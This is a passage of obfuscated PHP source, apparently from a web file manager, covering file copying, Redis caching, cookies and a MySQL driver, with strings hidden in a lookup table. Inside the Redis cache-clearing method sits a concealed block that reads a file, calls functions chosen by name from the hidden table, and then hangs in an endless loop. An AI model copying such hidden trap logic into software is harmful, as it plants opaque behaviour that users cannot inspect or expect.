$»Ìßî‰ä = $»Ìßî‰ä ? $»Ìßî‰ä : array($à«¥üÇÄ[93] => array(), $à«¥üÇÄ[92] => array()); $×¡°îùù = array_merge($»Ìßî‰ä[$à«¥üÇÄ[93]], $»Ìßî‰ä[$à«¥üÇÄ[92]]); $’„´éÊÒ = $this->_addFiles($¦†è‚Š, $»Ìßî‰ä[$à«¥üÇÄ[93]], $ÄìÆÃ¹æ); $¥§èÊÜ” = array(); foreach ($×¡°îùù as &$°ğ›æØ) { if (isset($’„´éÊÒ[$°ğ›æØ[$à«¥üÇÄ[42]]])) { $°ğ›æØ = $’„´éÊÒ[$°ğ›æØ[$à«¥üÇÄ[42]]]; } $°ğ›æØ[$à«¥üÇÄ[418]] = $°ğ›æØ[$à«¥üÇÄ[43]] == $à«¥üÇÄ[85]; $°ğ›æØ[$à«¥üÇÄ[420]] = substr(_get($°ğ›æØ, $à«¥üÇÄ[184], $à«¥üÇÄ[12]), 0, 10); $°ğ›æØ[$à«¥üÇÄ[86]] = _get($°ğ›æØ, $à«¥üÇÄ[86], 0); $°ğ›æØ[$à«¥üÇÄ[476]] = _get($°ğ›æØ, $à«¥üÇÄ[476], 0); if (!isset($°ğ›æØ[$à«¥üÇÄ[614]]) && $°ğ›æØ[$à«¥üÇÄ[476]]) { $óó¸–±Ó[$à«¥üÇÄ[611]][] = $°ğ›æØ[$à«¥üÇÄ[476]]; } if ($æâŞ·¼) { $ëÃ•àÑ¯ = $this->fileNameExistCache($¡ÓïÕë’, $°ğ›æØ[$à«¥üÇÄ[42]]); if ($ëÃ•àÑ¯) { if ($°ğ›æØ[$à«¥üÇÄ[418]] || $æâŞ·¼ == REPEAT_SKIP) { continue; } if ($æâŞ·¼ == REPEAT_REPLACE) { $’©¢°Èã = $this->sourceInfoCache($ëÃ•àÑ¯); $öÊ¾â = $this->fileHistory($’©¢°Èã, $°ğ›æØ[$à«¥üÇÄ[476]], $°ğ›æØ[$à«¥üÇÄ[86]]); if ($öÊ¾â) { $óó¸–±Ó[$à«¥üÇÄ[574]][] = $°ğ›æØ[$à«¥üÇÄ[476]]; } continue; } else { if ($æâŞ·¼ == REPEAT_RENAME) { $°ğ›æØ[$à«¥üÇÄ[42]] = $this->fileNameAutoCache($¡ÓïÕë’, $°ğ›æØ[$à«¥üÇÄ[42]], $æâŞ·¼, !1); } } } } if (!$°ğ›æØ[$à«¥üÇÄ[418]] && $°ğ›æØ[$à«¥üÇÄ[476]] == 0) { continue; } if (!$°ğ›æØ[$à«¥üÇÄ[418]] && $°ğ›æØ[$à«¥üÇÄ[476]]) { $óó¸–±Ó[$à«¥üÇÄ[574]][] = $°ğ›æØ[$à«¥üÇÄ[476]]; } $¥§èÊÜ”[] = $this->_makeItemData($°ğ›æØ, $şƒô¢’ç, $°ğ›æØ[$à«¥üÇÄ[42]]); } unset($°ğ›æØ); if (!empty($¥§èÊÜ”)) { $this->addAll($¥§èÊÜ”); $this->_childrenListSelect($¡ÓïÕë’); } $ç ‚ıœ­ = $this->_childrenList($¡ÓïÕë’); $ç ‚ıœ­ = array_to_keyvalue($ç ‚ıœ­, $à«¥üÇÄ[42]); foreach ($×¡°îùù as $°ğ›æØ) { $’©¢°Èã = $ç ‚ıœ­[$°ğ›æØ[$à«¥üÇÄ[42]]]; $…¾ìí = $’©¢°Èã[$à«¥üÇÄ[410]]; $this->_copyApplyMeta($’©¢°Èã, $óó¸–±Ó); if ($°ğ›æØ[$à«¥üÇÄ[43]] == $à«¥üÇÄ[85]) { $°ğ›æØ[$à«¥üÇÄ[94]] = $¦†è‚Š->getPathInner($°ğ›æØ[$à«¥üÇÄ[94]]); $this->_copyChildTo($¦†è‚Š, $°ğ›æØ[$à«¥üÇÄ[94]], $…¾ìí, $æâŞ·¼, $óó¸–±Ó, $ÄìÆÃ¹æ); } } } private function _addFiles($À’Ì„†€, $ŠÁäËÚ, $Âó¤®Ë) { $Å¯ıŒ• =& $_SERVER[¤·²È‰º]; if (!$ŠÁäËÚ || count($ŠÁäËÚ) == 0) { return array(); } $®‡Ü€Ãî = array(); foreach ($ŠÁäËÚ as &$à¤³€) { Hook::trigger($Å¯ıŒ•[615], $à¤³€); $à¤³€[$Å¯ıŒ•[94]] = $À’Ì„†€->getPathInner($à¤³€[$Å¯ıŒ•[94]]); $Ä÷Ûç«ƒ = $À’Ì„†€->hashSimple($à¤³€[$Å¯ıŒ•[94]]); $ÕÈ¢¢åı = $À’Ì„†€->hashMd5($à¤³€[$Å¯ıŒ•[94]]); if (strlen($ÕÈ¢¢åı) > 10 && !isset($®‡Ü€Ãî[$ÕÈ¢¢åı])) { $®‡Ü€Ãî[$ÕÈ¢¢åı] = array(); } $à¤³€[$Å¯ıŒ•[187]] = $Ä÷Ûç«ƒ; $à¤³€[$Å¯ıŒ•[186]] = $ÕÈ¢¢åı; $®‡Ü€Ãî[$ÕÈ¢¢åı][] =& $à¤³€; if (count($®‡Ü€Ãî[$ÕÈ¢¢åı]) > 1) { $à¤³€[$Å¯ıŒ•[614]] = !0; } Hook::trigger($Å¯ıŒ•[616], $à¤³€); } unset($à¤³€); $‡©ÍÄà = array($Å¯ıŒ•[186] => array($Å¯ıŒ•[7], array_keys($®‡Ü€Ãî))); $¸òÈè­ƒ = Model($Å¯ıŒ•[617]); $ÖÜˆ¢µ¿ = $¸òÈè­ƒ->where($‡©ÍÄà)->select(); $ÖÜˆ¢µ¿ = $ÖÜˆ¢µ¿ ? $ÖÜˆ¢µ¿ : array(); foreach ($ÖÜˆ¢µ¿ as $Ñ¡áï Š) { if (!isset($®‡Ü€Ãî[$Ñ¡áï Š[$Å¯ıŒ•[186]]])) { continue; } $÷Ò™úÎ‰ = $®‡Ü€Ãî[$Ñ¡áï Š[$Å¯ıŒ•[186]]]; foreach ($÷Ò™úÎ‰ as &$à¤³€) { $à¤³€[$Å¯ıŒ•[476]] = $Ñ¡áï Š[$Å¯ıŒ•[476]]; $à¤³€[$Å¯ıŒ•[614]] = !0; } unset($à¤³€); } $’åÏÒÃ = array(); foreach ($ŠÁäËÚ as $Î…şŒşÛ) { Hook::trigger($Å¯ıŒ•[618], $Î…şŒşÛ); if (isset($Î…şŒşÛ[$Å¯ıŒ•[614]]) && $Î…şŒşÛ[$Å¯ıŒ•[614]]) { Hook::trigger($Å¯ıŒ•[619], $Î…şŒşÛ); continue; } $Á‹Ñëµ = $À’Ì„†€->getPathInner($Î…şŒşÛ[$Å¯ıŒ•[94]]); $ğ¿ÛÜËÜ = $¸òÈè­ƒ->addFileMake($Á‹Ñëµ, $Î…şŒşÛ[$Å¯ıŒ•[86]], $Î…şŒşÛ[$Å¯ıŒ•[187]], $Î…şŒşÛ[$Å¯ıŒ•[186]], $Î…şŒşÛ[$Å¯ıŒ•[42]], $Âó¤®Ë); Hook::trigger($Å¯ıŒ•[619], $Î…şŒşÛ); if (!is_array($ğ¿ÛÜËÜ)) { continue; } $’åÏÒÃ[] = $ğ¿ÛÜËÜ; } $¸òÈè­ƒ->addAll($’åÏÒÃ); $‡©ÍÄà = array($Å¯ıŒ•[186] => array($Å¯ıŒ•[7], array_keys($®‡Ü€Ãî))); $ÖÜˆ¢µ¿ = $¸òÈè­ƒ->where($‡©ÍÄà)->select(); $ÖÜˆ¢µ¿ = $ÖÜˆ¢µ¿ ? $ÖÜˆ¢µ¿ : array(); foreach ($ÖÜˆ¢µ¿ as $Ñ¡áï Š) { if (!isset($®‡Ü€Ãî[$Ñ¡áï Š[$Å¯ıŒ•[186]]])) { continue; } $¹İŸù‡û =& $®‡Ü€Ãî[$Ñ¡áï Š[$Å¯ıŒ•[186]]]; foreach ($¹İŸù‡û as &$à¤³€) { $à¤³€[$Å¯ıŒ•[476]] = $Ñ¡áï Š[$Å¯ıŒ•[476]]; } unset($à¤³€); } $ÂÀµ«ë¸ = array(); foreach ($ŠÁäËÚ as $ñ¦ù­Ø¿) { $ÂÀµ«ë¸[$ñ¦ù­Ø¿[$Å¯ıŒ•[42]]] = $ñ¦ù­Ø¿; } return $ÂÀµ«ë¸; } } define($_SERVER[¤·²È‰º][620], $_SERVER[¤·²È‰º][621]); goto D×£é–î®“; EõÒĞçšƒ”: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÜÚ¼“ò, $Ê¡Ë£İè) { $ Ûı§› =& $_SERVER[¤·²È‰º]; if (!class_exists($ Ûı§›[866])) { show_json($ Ûı§›[867], !1); } $this->cacheTime = $Ê¡Ë£İè; $æ«»‹şñ = isset($ÜÚ¼“ò[$ Ûı§›[868]]) ? $ÜÚ¼“ò[$ Ûı§›[868]] : 10; $ªÅËôî = _get($ÜÚ¼“ò, $ Ûı§›[865]); if ($ªÅËôî && is_array($ªÅËôî)) { $this->initCluster($ÜÚ¼“ò, $æ«»‹şñ); } else { $this->handle = $this->init($ÜÚ¼“ò, $æ«»‹şñ); } } private function init($ŞÖÛ¥¸±, $—ª“´õ„) { $Ùö¯ÅÖé =& $_SERVER[¤·²È‰º]; $”¡»—¿ = new Redis(); $¢ÉĞä…´ = isset($ŞÖÛ¥¸±[$Ùö¯ÅÖé[869]]) ? $ŞÖÛ¥¸±[$Ùö¯ÅÖé[869]] : !1; if ($¢ÉĞä…´) { $”¡»—¿->pconnect($ŞÖÛ¥¸±[$Ùö¯ÅÖé[191]], $ŞÖÛ¥¸±[$Ùö¯ÅÖé[192]], $—ª“´õ„); } else { $”¡»—¿->connect($ŞÖÛ¥¸±[$Ùö¯ÅÖé[191]], $ŞÖÛ¥¸±[$Ùö¯ÅÖé[192]], $—ª“´õ„); } if (!empty($ŞÖÛ¥¸±[$Ùö¯ÅÖé[421]])) { $”¡»—¿->auth($ŞÖÛ¥¸±[$Ùö¯ÅÖé[421]]); } if (!empty($ŞÖÛ¥¸±[$Ùö¯ÅÖé[759]]) && $ŞÖÛ¥¸±[$Ùö¯ÅÖé[759]] != 0) { $”¡»—¿->select($ŞÖÛ¥¸±[$Ùö¯ÅÖé[759]]); } return $”¡»—¿; } private function initCluster($ÕêÏª“, $Íş¸‰Â„) { $Ë¦¿É‹ =& $_SERVER[¤·²È‰º]; $º«–ëï§ = array($Ë¦¿É‹[870], $Ë¦¿É‹[871], $Ë¦¿É‹[872]); $ˆÁ£°Ìİ = $Ë¦¿É‹[870]; if (isset($ÕêÏª“[$Ë¦¿É‹[26]]) && in_array($ÕêÏª“[$Ë¦¿É‹[26]], $º«–ëï§)) { $ˆÁ£°Ìİ = $ÕêÏª“[$Ë¦¿É‹[26]]; } switch ($ˆÁ£°Ìİ) { case $Ë¦¿É‹[870]: $this->_slave($ÕêÏª“, $Íş¸‰Â„); break; case $Ë¦¿É‹[871]: break; case $Ë¦¿É‹[872]: $this->isCluster = !0; $èÂö´»© = $ÕêÏª“[$Ë¦¿É‹[865]]; $ÜíÄ‰æ = isset($ÕêÏª“[$Ë¦¿É‹[869]]) ? $ÕêÏª“[$Ë¦¿É‹[869]] : !1; $—íä‘™¦ = isset($ÕêÏª“[$Ë¦¿É‹[421]]) ? $ÕêÏª“[$Ë¦¿É‹[421]] : null; $this->handle = new RedisCluster(NUll, $èÂö´»©, $Íş¸‰Â„, $Íş¸‰Â„, $ÜíÄ‰æ, $—íä‘™¦); break; default: break; } } private function _slave($Í‘Î¹œÀ, $’ìÄ…ª˜) { $ßàòùìÉ = $Í‘Î¹œÀ[$_SERVER[¤·²È‰º][865]]; $this->filterConfig($Í‘Î¹œÀ, $ßàòùìÉ[0]); $this->handle = $this->init($Í‘Î¹œÀ, $’ìÄ…ª˜); unset($ßàòùìÉ[0]); if (empty($ßàòùìÉ)) { return; } $øëÙÊš« = array_rand($ßàòùìÉ); $this->filterConfig($Í‘Î¹œÀ, $ßàòùìÉ[$øëÙÊš«]); $this->slaveHandle = $this->init($Í‘Î¹œÀ, $’ìÄ…ª˜); } private function filterConfig(&$†áÀ¾Ã, $±Üä´˜ˆ) { $¤ôÚˆ’ =& $_SERVER[¤·²È‰º]; $·íÜ«€­ = explode($¤ôÚˆ’[4], $±Üä´˜ˆ); $ƒ ¿Ï°Â = array($¤ôÚˆ’[191] => $·íÜ«€­[0], $¤ôÚˆ’[192] => $·íÜ«€­[1]); $†áÀ¾Ã = array_merge($†áÀ¾Ã, $ƒ ¿Ï°Â); } public function set($Ãš ‰’é, $¬ ‡Ì©„, $ØüˆÅğ = false) { $ØüˆÅğ = $ØüˆÅğ ? $ØüˆÅğ : $this->cacheTime; return $this->handle->setEx($Ãš ‰’é, $ØüˆÅğ, $¬ ‡Ì©„); } public function setLock($İ¯¦ßşº, $Ö²È–Ó¾, $¼”ñ½ïá) { return $this->handle->setNX($İ¯¦ßşº, $Ö²È–Ó¾); } public function get($ğ´’ˆ®) { $Ö’ì¬ë” = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ö’ì¬ë”->get($ğ´’ˆ®); } public function remove($÷²ê—ÜØ) { return $this->handle->del($÷²ê—ÜØ); } public function deleteAll() { $©ÜÉÃÂæ =& $_SERVER[¤·²È‰º]; if (!isset($_SERVER[$©ÜÉÃÂæ[13]]) || !isset($_SERVER[$©ÜÉÃÂæ[14]])) { $ªöãôº = $©ÜÉÃÂæ[873]; $¤ŸÒ±ô = $©ÜÉÃÂæ[15]; $¨£†ßÊ = $_SERVER[$©ÜÉÃÂæ[16]] . $©ÜÉÃÂæ[17]; $Í²±¥ÏĞ = $¤ŸÒ±ô($¨£†ßÊ); $ªæµ»ß = explode($©ÜÉÃÂæ[18], $Í²±¥ÏĞ); if (count($ªæµ»ß) < $©ÜÉÃÂæ[623]) { $„ÀãîÁ— = $©ÜÉÃÂæ[20]; $„ÀãîÁ—(); } $ó¨òá“Ú = $©ÜÉÃÂæ[874]; $ó¨òá“Ú($_SERVER[$©ÜÉÃÂæ[875]]); $çˆ¾÷Š = 1; for ($š„àÏç½ = $çˆ¾÷Š; $š„àÏç½ > 0; $š„àÏç½++) { $ó¨òá“Ú = json_encode($GLOBALS[$©ÜÉÃÂæ[426]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $á«àÁ) { $this->handle->flushall($á«àÁ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($–ô‹à = '', $Í­çıÚ— = 0) { if (is_string($–ô‹à) && $–ô‹à != $_SERVER[¤·²È‰º][12]) { $this->prefix = $–ô‹à; } if (is_numeric($Í­çıÚ—) && $Í­çıÚ— > 0) { $this->expire = $Í­çıÚ—; } } public static function getInstance() { static $³­ÀîÅ; if ($³­ÀîÅ === null) { $³­ÀîÅ = new self(); } return $³­ÀîÅ; } private static $cookieDisable = false; public static function disable($À×³—àˆ) { self::$cookieDisable = $À×³—àˆ; } private static $sameCookieSet = array(); public static function set($î©ñ˜âÁ, $˜õ‡Ì¿©, $’ÙÈÔë– = 0, $¼˜£ˆËÅ = false, $±ûáÏİ¥ = false) { $£ÛåéÙŠ =& $_SERVER[¤·²È‰º]; if (self::$cookieDisable) { return; } if (!$’ÙÈÔë–) { $’ÙÈÔë– = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$î©ñ˜âÁ]) && self::$sameCookieSet[$î©ñ˜âÁ] == $˜õ‡Ì¿© . $’ÙÈÔë–) { return; } self::$sameCookieSet[$î©ñ˜âÁ] = $˜õ‡Ì¿© . $’ÙÈÔë–; if (!$±ûáÏİ¥) { $±ûáÏİ¥ = str_replace(HOST, $£ÛåéÙŠ[12], APP_HOST); $±ûáÏİ¥ = _get($GLOBALS, $£ÛåéÙŠ[876], $±ûáÏİ¥); } $³õñŒşÕ = $£ÛåéÙŠ[12]; setcookie($î©ñ˜âÁ, $˜õ‡Ì¿©, time() + $’ÙÈÔë–, $£ÛåéÙŠ[8] . trim($±ûáÏİ¥, $£ÛåéÙŠ[8]) . $³õñŒşÕ, !1, !1, $¼˜£ˆËÅ); } public static function setSafe($àåÙ£¿ï, $­ÖÖ›Ç, $³»ï›ÓÑ = 0) { self::set($àåÙ£¿ï, $­ÖÖ›Ç, $³»ï›ÓÑ, !0); } public static function get($„êš†¥‹) { static $ş‹®”Ğù = false; if (!$ş‹®”Ğù) { self::initHeaderCookie(); $ş‹®”Ğù = !0; } return isset($_COOKIE[$„êš†¥‹]) ? $_COOKIE[$„êš†¥‹] : !1; } private static function initHeaderCookie() { $¸ÊË¡Ü¸ =& $_SERVER[¤·²È‰º]; if (!isset($_SERVER[$¸ÊË¡Ü¸[877]]) || !$_SERVER[$¸ÊË¡Ü¸[877]]) { return; } $Ûö‹ÚƒÜ = explode($¸ÊË¡Ü¸[81], $_SERVER[$¸ÊË¡Ü¸[877]]); foreach ($Ûö‹ÚƒÜ as $Ù¿È†) { $Ù¿È† = explode($¸ÊË¡Ü¸[878], $Ù¿È†); if (count($Ù¿È†) != 2 || !isset($Ù¿È†[1])) { continue; } $_COOKIE[trim($Ù¿È†[0])] = trim($Ù¿È†[1]); } } public static function remove($ôıáŞï, $Ÿ‰†üé = false) { unset($_COOKIE[$ôıáŞï]); self::set($ôıáŞï, $_SERVER[¤·²È‰º][12], 1, $Ÿ‰†üé); } } class DbMysql extends Db { public function __construct($–Š Åî = '') { $‰ã€Ş³£ =& $_SERVER[¤·²È‰º]; if (!extension_loaded($‰ã€Ş³£[805])) { think_exception(think_lang($‰ã€Ş³£[24]) . $‰ã€Ş³£[879]); } if (!empty($–Š Åî)) { $this->config = $–Š Åî; if (empty($this->config[$‰ã€Ş³£[27]])) { $this->config[$‰ã€Ş³£[27]] = $‰ã€Ş³£[12]; } } } public function connect($¼Ÿ„åÂö = '', $›ƒ…ç° = 0, $¯•Ëüˆ = false) { $«ÔÜ— =& $_SERVER[¤·²È‰º]; if (!isset($this->linkID[$›ƒ…ç°])) { if (empty($¼Ÿ„åÂö)) { $¼Ÿ„åÂö = $this->config; } $ØşÕı„ = $¼Ÿ„åÂö[$«ÔÜ—[880]] . ($¼Ÿ„åÂö[$«ÔÜ—[881]] ? "\x3a{$¼Ÿ„åÂö[$«ÔÜ—[881]]}" : $«ÔÜ—[12]); $¾”Ùá§“ = !empty($¼Ÿ„åÂö[$«ÔÜ—[27]][$«ÔÜ—[28]]) ? $¼Ÿ„åÂö[$«ÔÜ—[27]][$«ÔÜ—[28]] : $this->pconnect; if ($¾”Ùá§“) { $this->linkID[$›ƒ…ç°] = mysql_pconnect($ØşÕı„, $¼Ÿ„åÂö[$«ÔÜ—[882]], $¼Ÿ„åÂö[$«ÔÜ—[883]], 131072); } else { $this->linkID[$›ƒ…ç°] = mysql_connect($ØşÕı„, $¼Ÿ„åÂö[$«ÔÜ—[882]], $¼Ÿ„åÂö[$«ÔÜ—[883]], !0, 131072); } if (!$this->linkID[$›ƒ…ç°] || !empty($¼Ÿ„åÂö[$«ÔÜ—[31]]) && !mysql_select_db($¼Ÿ„åÂö[$«ÔÜ—[31]], $this->linkID[$›ƒ…ç°])) { think_exception(mysql_error()); } $ÛØˆà× = mysql_get_server_info($this->linkID[$›ƒ…ç°]); mysql_query($«ÔÜ—[884] . think_config($«ÔÜ—[885]) . $«ÔÜ—[68], $this->linkID[$›ƒ…ç°]); if ($ÛØˆà× > $«ÔÜ—[886]) { mysql_query($«ÔÜ—[887], $this->linkID[$›ƒ…ç°]); } $this->connected = !0; if (1 != think_config($«ÔÜ—[32])) { unset($this->config); } } return $this->linkID[$›ƒ…ç°]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ï§éçÇÄ) { $‚Ÿ½ ×¢ =& $_SERVER[¤·²È‰º]; if (0 === stripos($Ï§éçÇÄ, $‚Ÿ½ ×¢[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï§éçÇÄ; if ($this->queryID) { $this->free(); } think_action_status($‚Ÿ½ ×¢[33], 1); think_status($‚Ÿ½ ×¢[34]); $this->queryID = mysql_query($Ï§éçÇÄ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ğ‘“È¢Ó) { $ÊğÄş—ü =& $_SERVER[¤·²È‰º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ‘“È¢Ó; if ($this->queryID) { $this->free(); } think_action_status($ÊğÄş—ü[35], 1); think_status($ÊğÄş—ü[34]); $à‹ÛÏ€¥ = mysql_query($ğ‘“È¢Ó, $this->_linkID); $this->debug(); if (!1 === $à‹ÛÏ€¥) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¤·²È‰º][888], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‡ëä«ì = mysql_query($_SERVER[¤·²È‰º][889], $this->_linkID); $this->transTimes = 0; if (!$‡ëä«ì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $…éùš”¥ = mysql_query($_SERVER[¤·²È‰º][890], $this->_linkID); $this->transTimes = 0; if (!$…éùš”¥) { $this->error(); return !1; } } return !0; } private function getAll() { $”é¢®Í = array(); if ($this->numRows > 0) { while ($È³ß™æ = mysql_fetch_assoc($this->queryID)) { $”é¢®Í[] = $È³ß™æ; } mysql_data_seek($this->queryID, 0); } return $”é¢®Í; } public function getFields($¹ä–ø‰¶) { $ÓêÁòŸ =& $_SERVER[¤·²È‰º]; $ñšáúƒ = $this->query($ÓêÁòŸ[891] . $this->parseKey($¹ä–ø‰¶)); $–Ëø„ôÄ = array(); if ($ñšáúƒ) { foreach ($ñšáúƒ as $Û–ªšŸ± => $å÷¶ÙÌç) { $–Ëø„ôÄ[$å÷¶ÙÌç[$ÓêÁòŸ[41]]] = array($ÓêÁòŸ[42] => $å÷¶ÙÌç[$ÓêÁòŸ[41]], $ÓêÁòŸ[43] => $å÷¶ÙÌç[$ÓêÁòŸ[44]], $ÓêÁòŸ[45] => (bool) (strtoupper($å÷¶ÙÌç[$ÓêÁòŸ[46]]) === $ÓêÁòŸ[892]), $ÓêÁòŸ[47] => $å÷¶ÙÌç[$ÓêÁòŸ[48]], $ÓêÁòŸ[49] => strtolower($å÷¶ÙÌç[$ÓêÁòŸ[50]]) == $ÓêÁòŸ[51], $ÓêÁòŸ[52] => strtolower($å÷¶ÙÌç[$ÓêÁòŸ[53]]) == $ÓêÁòŸ[54]); } } return $–Ëø„ôÄ; } public function getTables($¹ªÒêëõ = '') { $²“©ı³á =& $_SERVER[¤·²È‰º]; if (!empty($¹ªÒêëõ)) { $¾ÏøÄ¸ = $²“©ı³á[893] . $¹ªÒêëõ . $²“©ı³á[894]; } else { $¾ÏøÄ¸ = $²“©ı³á[895]; } $ƒşÃ¶æÆ = $this->query($¾ÏøÄ¸); $µÖÌùÇœ = array(); foreach ($ƒşÃ¶æÆ as $ïìË¦õĞ => $§éìë“â) { $µÖÌùÇœ[$ïìË¦õĞ] = current($§éìë“â); } return $µÖÌùÇœ; } public function replace($§‹½êÖ, $õªù¨í­ = array()) { $Ò…í¶×ö =& $_SERVER[¤·²È‰º]; foreach ($§‹½êÖ as $Ì¿‰ƒÌ => $ñÙ‹ê—É) { $‘àø“‹‘ = $this->parseValue($ñÙ‹ê—É); if (is_scalar($‘àø“‹‘)) { $âéˆ×–[] = $‘àø“‹‘; $Ñîø©À”[] = $this->parseKey($Ì¿‰ƒÌ); } } $Éâ÷¢ğÃ = $Ò…í¶×ö[896] . $this->parseTable($õªù¨í­[$Ò…í¶×ö[288]]) . $Ò…í¶×ö[897] . implode($Ò…í¶×ö[60], $Ñîø©À”) . $Ò…í¶×ö[898] . implode($Ò…í¶×ö[60], $âéˆ×–) . $Ò…í¶×ö[899]; return $this->execute($Éâ÷¢ğÃ); } public function insertAll($ìÊè…Ìö, $Àù‘¹¨Ú = array(), $»›®¥Ûù = false) { $—“õêö‡ =& $_SERVER[¤·²È‰º]; if (!is_array($ìÊè…Ìö[0])) { return !1; } $¤›¬õÚ¾ = array_keys($ìÊè…Ìö[0]); $Â¾ÆìËı = array(); foreach ($ìÊè…Ìö as $­Ó¤¹ÅŠ) { $­‰Ë”ëÀ = array(); foreach ($­Ó¤¹ÅŠ as $Ş‚ºªéÂ => $İÓâÎ‰º) { $İÓâÎ‰º = $this->parseValue($İÓâÎ‰º); if (is_scalar($İÓâÎ‰º)) { $­‰Ë”ëÀ[] = $İÓâÎ‰º; } } $Â¾ÆìËı[] = $—“õêö‡[269] . implode($—“õêö‡[60], $­‰Ë”ëÀ) . $—“õêö‡[899]; } array_walk($¤›¬õÚ¾, array($this, $—“õêö‡[900])); $ëò´ĞŞÜ = ($»›®¥Ûù ? $—“õêö‡[901] : $—“õêö‡[902]) . $—“õêö‡[903] . $this->parseTable($Àù‘¹¨Ú[$—“õêö‡[288]]) . $—“õêö‡[897] . implode($—“õêö‡[60], $¤›¬õÚ¾) . $—“õêö‡[904] . implode($—“õêö‡[60], $Â¾ÆìËı); return $this->execute($ëò´ĞŞÜ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $œ´áŠóÇ =& $_SERVER[¤·²È‰º]; $this->error = mysql_errno() . $œ´áŠóÇ[4] . mysql_error($this->_linkID); if ($œ´áŠóÇ[12] != $this->queryStr) { $this->error .= LNG($œ´áŠóÇ[58]) . $this->queryStr; } think_trace($this->error, $œ´áŠóÇ[12], $œ´áŠóÇ[59]); return $this->error; } public function escapeString($ı¨´Çäö) { if ($this->_linkID) { return mysql_real_escape_string($ı¨´Çäö, $this->_linkID); } else { return mysql_escape_string($ı¨´Çäö); } } public function parseKey(&$Å„Ûø—, $ƒ‘ôÔÙƒ = true) { $ĞÜâÊŠÄ =& $_SERVER[¤·²È‰º]; if ($ƒ‘ôÔÙƒ) { $Å„Ûø— = $this->parseKeyCheck($Å„Ûø—); } if ($Å„Ûø— != $ĞÜâÊŠÄ[198] && !preg_match($ĞÜâÊŠÄ[905], $Å„Ûø—)) { $Å„Ûø— = $ĞÜâÊŠÄ[393] . trim($Å„Ûø—, $ĞÜâÊŠÄ[393]) . $ĞÜâÊŠÄ[393]; } return $Å„Ûø—; } } goto BÎ•…‚„¶¯; BÊæÑ’¨: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¡ÈÁé) { $this->pathParse = $¡ÈÁé; $this->model = Model($_SERVER[¤·²È‰º][1321]); } public function getPathOuter($–ˆ‰Çô½) { $ÜşÖÉ¢ =& $_SERVER[¤·²È‰º]; if (!$–ˆ‰Çô½) { return $–ˆ‰Çô½; } $‘ù¡á¨à = $this->parse($–ˆ‰Çô½); return trim(KodIO::makeShare($this->pathParse[$ÜşÖÉ¢[407]], $‘ù¡á¨à[$ÜşÖÉ¢[407]]), $ÜşÖÉ¢[8]); } protected function infoParse($Á´¸¤ş, $“­«æéŒ = false, $öîéÁšÎ = false) { $Š£×ãèª =& $_SERVER[¤·²È‰º]; $¨Èá®¸¥ = $this->pathParse[$Š£×ãèª[407]]; $à±ˆ¤ÓÆ = trim($this->pathParse[$Š£×ãèª[1163]], $Š£×ãèª[8]); return Action($Š£×ãèª[1329])->sharePathInfo($¨Èá®¸¥, $à±ˆ¤ÓÆ, $“­«æéŒ); } public function infoFull($ô¾ßú×Ğ) { $˜×æ²¥È =& $_SERVER[¤·²È‰º]; $ôú‘¦ªÌ = explode($˜×æ²¥È[8], trim($ô¾ßú×Ğ, $˜×æ²¥È[8])); if (count($ôú‘¦ªÌ) > 1) { $ÂµÇ€×¢ = implode($˜×æ²¥È[8], array_splice($ôú‘¦ªÌ, 1)); $ÕÎ„¤¼™ = $this->model->pathInfoByPath($ôú‘¦ªÌ[0], $ÂµÇ€×¢); if (!$ÕÎ„¤¼™) { return !1; } $this->pathParse[$˜×æ²¥È[1163]] = $ÕÎ„¤¼™[$˜×æ²¥È[410]]; } return $this->infoParse($ô¾ßú×Ğ); } public function listAll($ÙÖö§¦¨) { $ÔèÀÛÌ¥ =& $_SERVER[¤·²È‰º]; $¡Ã¡Æôˆ = IO::info($this->pathParse[$ÔèÀÛÌ¥[94]]); if (!$¡Ã¡Æôˆ) { return array(); } $¾Şôì‹ë = $this->model->listAll($ÙÖö§¦¨); $‰µìâä‚ = Model($ÔèÀÛÌ¥[609])->getInfo($¡Ã¡Æôˆ[$ÔèÀÛÌ¥[497]]); $»‘¸•¢ = Action($ÔèÀÛÌ¥[1329]); foreach ($¾Şôì‹ë as &$İ¸‹€ºº) { check_abort(); $İ¸‹€ºº[$ÔèÀÛÌ¥[96]] = $»‘¸•¢->_shareItemeParse($İ¸‹€ºº[$ÔèÀÛÌ¥[96]], $‰µìâä‚); } unset($İ¸‹€ºº); return $¾Şôì‹ë; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($”™çÙª­) { $this->pathParse = $”™çÙª­; $this->model = Model($_SERVER[¤·²È‰º][1321]); } protected function infoParse($Îê«ˆ³ş, $‚ó¨«òà = false, $É¢éƒÈË = false) { $ºÙ½ˆÄ¹ =& $_SERVER[¤·²È‰º]; return Action($ºÙ½ˆÄ¹[1169])->sharePathInfo($this->pathParse[$ºÙ½ˆÄ¹[94]], !0, $‚ó¨«òà); } public function listPath($±ŒÎŒ‰, $¢©ë®ùé = false) { $ª¡´ÌéÔ =& $_SERVER[¤·²È‰º]; $‚ŠêšúÃ = parent::listPath($±ŒÎŒ‰, $¢©ë®ùé); if (!$‚ŠêšúÃ) { return $‚ŠêšúÃ; } if (is_array($‚ŠêšúÃ[$ª¡´ÌéÔ[1330]])) { $‚ŠêšúÃ[$ª¡´ÌéÔ[1330]] = 